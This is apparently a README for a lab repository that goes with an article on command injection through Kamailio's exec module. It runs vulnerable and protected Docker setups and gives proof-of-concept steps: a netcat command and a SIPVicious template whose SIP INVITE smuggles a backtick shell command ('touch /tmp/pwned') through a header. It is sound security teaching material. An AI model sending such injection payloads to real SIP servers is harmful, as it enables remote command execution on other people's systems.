# Kamailio exec module examples

This repository includes examples referenced from https://www.rtcsec.com/article/kamailio-exec-module-considered-harmful.

Note: depending on your Docker setup, you might need to use the command `docker compose` instead of `docker-compose`.

## Starting Kamailio

To run the vulnerable version of the Kamailio configuration:

```bash
docker-compose run kamailio-vulnerable
```

To run the protected version:

```bash
docker-compose run kamailio-protected
```

## Exploitation

We give two examples for exploitation, one making use of netcat and the other uses [SIPVicious PRO](https://www.enablesecurity.com/sipvicious/pro/) which is commercially available.

### Netcat PoC

1. Start monitoring the `/tmp` directory:

    ```bash
    docker-compose exec kamailio-vulnerable watch ls -alh /tmp
    ```

2. To run the PoC use the following instruction:

    ```bash
    cat poc.txt | nc 127.0.0.1 5060
    ```

3. Observe the result in the directory listing

## SIPVicious PRO PoC

When making use of the stable version of SIPVicious PRO, one may use the [repeater tool](https://docs.sipvicious.pro/stable/cui-reference/sip/utils/repeater/) to reproduce this issue as follows:

1. Save the following template as `inviterequest.tpl` (or switch to the `svpro` directory in this repository):

    ```
    INVITE sip:`$SIP_HF_COMMAND`@127.0.0.1 SIP/2.0
    Command: {{ ENV "COMMAND" }}
    Via: SIP/2.0/{{.AddrFamily}} {{.LocalAddr}};rport;branch=z9hG4bK-{{.Branch}}
    Max-Forwards: 70
    From: {{.FromVal}}
    To: {{.ToVal}}
    Call-ID: {{.CallID}}
    CSeq: {{.CSeq}} INVITE
    Contact: {{.ContactVal}}
    Content-Length: {{.Body | len}}
    Content-Type: application/sdp

    {{.Body -}}
    ```
2. Start monitoring the `/tmp` directory:

    ```bash
    docker-compose exec kamailio-vulnerable watch ls -alh /tmp
    ```

3. Run the PoC as follows:

    ```bash
    COMMAND="touch /tmp/pwned" sipvicious sip utils repeater udp://127.0.0.1:5060 -m invite
    ```

4. Observe the result in the directory listing

One may also make use of a new experimental tool called [iterator](https://docs.sipvicious.pro/experimental/cui-reference/sip/utils/iterator/) which can act like a scanner or fuzzer to identify this vulnerability semi-automatically.

## Build

The image is already available on the Docker registry. If you would like to build it, you may do so as follows:

```bash
docker-compose build
```
